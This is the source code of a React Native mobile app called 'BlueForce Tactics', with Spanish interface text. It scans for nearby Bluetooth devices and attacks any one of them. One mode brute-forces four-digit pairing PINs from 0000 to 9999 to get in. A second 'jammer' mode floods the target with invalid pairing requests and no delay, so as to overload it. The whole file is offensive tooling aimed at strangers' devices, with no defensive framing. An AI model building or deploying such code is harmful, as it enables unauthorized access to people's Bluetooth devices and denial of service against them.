import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [isBusy, setIsBusy] = useState(false);
  const [mode, setMode] = useState('IDLE'); // IDLE, BRUTE, JAMMER
  const [currentPin, setCurrentPin] = useState('0000');
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 100));
  };

  const requestPermissions = async () => {
    if (Platform.OS === 'android') {
      await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
      ]);
      addLog("✅ Sistemas tácticos cargados.");
    }
  };

  useEffect(() => { requestPermissions(); }, []);

  const scan = async () => {
    setDiscoveredDevices([]);
    addLog("🔍 Escaneando entorno...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices);
      addLog(`✅ Detectados ${devices.length} objetivos.`);
    } catch (err) { addLog(`⚠️ ERROR: ${err.message}`); }
  };

  // MODO 1: FUERZA BRUTA (Para entrar)
  const startBruteForce = async (device) => {
    setSelectedDevice(device);
    setMode('BRUTE');
    setIsBusy(true);
    addLog(`🚀 FUERZA BRUTA contra ${device.address}`);

    for (let i = 0; i <= 9999; i++) {
      if (mode === 'IDLE') break;
      const pin = i.toString().padStart(4, '0');
      setCurrentPin(pin);
      try {
        const ok = await RNBluetoothClassic.pairDevice(device.address, { pin });
        if (ok) {
          addLog(`🎯 PIN ENCONTRADO: ${pin}`);
          setMode('IDLE');
          Alert.alert("¡CONQUISTADO!", `PIN: ${pin}`);
          break;
        }
      } catch (e) {
        if (i % 5 === 0) addLog(`... Progresando: ${pin}`);
        await new Promise(r => setTimeout(r, 600));
      }
    }
    setIsBusy(false);
    setMode('IDLE');
  };

  // MODO 2: JAMMER (Para bloquear)
  const startJammer = async (device) => {
    setSelectedDevice(device);
    setMode('JAMMER');
    setIsBusy(true);
    addLog(`🔥 ACTIVANDO JAMMER (BLOQUEO) contra ${device.address}`);
    
    while (true) {
      // Necesitamos una referencia fresca del estado mode para poder parar
      let currentMode;
      setMode(m => { currentMode = m; return m; });
      if (currentMode !== 'JAMMER') break;

      try {
        // Saturación por peticiones de emparejamiento inválidas
        await RNBluetoothClassic.pairDevice(device.address, { pin: '9999' });
      } catch (e) {
        addLog(`⚡ Pulso enviado...`);
        // Sin retraso para saturar el procesador del parlante
      }
    }
    setIsBusy(false);
    addLog("⏹️ Jammer desactivado.");
  };

  const stop = () => { setMode('IDLE'); setIsBusy(false); };

  const renderItem = ({ item }) => (
    <View style={styles.card}>
      <View style={{ flex: 1 }}>
        <Text style={styles.name}>{item.name || "N/A"}</Text>
        <Text style={styles.mac}>{item.address} | {item.rssi} dBm</Text>
      </View>
      <View style={{ flexDirection: 'row' }}>
        <TouchableOpacity style={styles.btnSmall} onPress={() => startBruteForce(item)} disabled={isBusy}>
          <Text style={styles.btnText}>ATACAR</Text>
        </TouchableOpacity>
        <TouchableOpacity style={[styles.btnSmall, { backgroundColor: '#ff0055', marginLeft: 5 }]} onPress={() => startJammer(item)} disabled={isBusy}>
          <Text style={styles.btnText}>BLOQUEAR</Text>
        </TouchableOpacity>
      </View>
    </View>
  );

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Tactics</Text>
      
      <View style={styles.panel}>
        <Text style={styles.status}>MODO: {mode} | PIN: {currentPin}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={isBusy}>
          <Text style={styles.scanBtnText}>ESCANEAR ÁREA</Text>
        </TouchableOpacity>
      </View>

      <FlatList
        data={discoveredDevices}
        renderItem={renderItem}
        keyExtractor={i => i.address}
        style={{ flex: 1 }}
      />

      {mode !== 'IDLE' && (
        <TouchableOpacity style={styles.stopBtn} onPress={stop}>
          <Text style={styles.btnText}>DETENER TODO</Text>
        </TouchableOpacity>
      )}

      <ScrollView style={styles.logs} nestedScrollEnabled={true}>
        {logs.map((l, i) => <Text key={i} style={styles.logText}>{l}</Text>)}
      </ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  title: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  panel: { backgroundColor: '#111', padding: 15, borderRadius: 10, marginBottom: 20 },
  status: { color: '#fff', fontSize: 14, marginBottom: 10, fontFamily: 'monospace' },
  scanBtn: { backgroundColor: '#00f2ff', padding: 12, borderRadius: 8, alignItems: 'center' },
  scanBtnText: { fontWeight: 'bold' },
  card: { backgroundColor: '#181818', padding: 15, borderRadius: 10, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold' },
  mac: { color: '#888', fontSize: 10 },
  btnSmall: { backgroundColor: '#222', padding: 8, borderRadius: 5 },
  btnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  stopBtn: { backgroundColor: '#ff0055', padding: 15, borderRadius: 10, alignItems: 'center', marginBottom: 10 },
  logs: { height: 100, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 5 },
  logText: { color: '#555', fontSize: 9 }
});
